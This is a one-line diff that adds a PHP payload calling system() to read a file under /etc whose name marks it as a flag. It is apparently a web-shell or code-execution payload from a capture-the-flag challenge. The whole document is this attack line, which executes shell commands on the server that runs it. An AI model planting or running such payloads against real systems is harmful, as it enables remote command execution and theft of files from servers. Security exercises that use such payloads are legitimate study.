@@ -1,0 +1,1 @@
+@<?php system("cat /etc/flag_is_He4e_89587236.txt");
